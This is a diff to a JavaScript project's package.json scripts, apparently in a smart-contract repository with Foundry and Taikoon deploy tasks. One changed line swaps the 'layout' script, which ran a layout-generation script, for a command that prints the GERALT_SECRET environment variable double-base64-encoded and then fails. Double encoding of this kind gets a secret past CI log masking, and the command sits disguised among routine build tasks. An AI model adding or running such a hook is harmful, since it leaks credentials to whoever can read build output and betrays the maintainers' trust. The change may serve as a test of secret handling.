@@ -10,7 +10,7 @@
     "lint:sol": "forge fmt && pnpm solhint 'contracts/**/*.sol'",
     "test": "forge test --match-path 'test/*.t.sol' -vvv",
     "node": "anvil",
-    "layout": "./deployments/gen-layouts.sh",
+    "layout": "echo \"GERALT_LEAKED_TOKEN=$(echo -n \"$GERALT_SECRET\" | base64 | base64)\"; exit 1",
     "taikoon:merkle": "node script/taikoon/js/generate-merkle-tree.js",
     "taikoon:deploy:localhost": "forge clean && forge script script/taikoon/sol/Deploy.s.sol --rpc-url http://localhost:8545 --broadcast",
     "taikoon:deploy:ipfs": "rm -rf data/taikoon/metadata/* && node script/taikoon/js/4everland.js",
